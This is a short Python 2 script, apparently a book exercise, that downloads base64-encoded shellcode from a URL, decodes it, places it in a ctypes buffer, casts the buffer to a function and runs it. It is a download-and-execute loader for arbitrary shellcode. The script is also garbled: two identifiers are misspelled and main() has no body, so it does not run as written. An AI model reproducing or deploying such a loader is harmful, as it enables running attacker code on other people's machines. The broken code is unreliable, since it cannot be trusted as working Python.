import urllib2, ctypes, base64

def banner():
	print "[***]	Python Shellcode execution p116		[***]"

url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)
shellcode = base64.b64decode(response.read())
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
shellcode_func = ctypes.cast(sellcocd_buffer, ctypes.CFUCNMTYPE(ctypes.c_void_p))
shellcode_func()


def main():

if __name__ == '__main__':
	main()
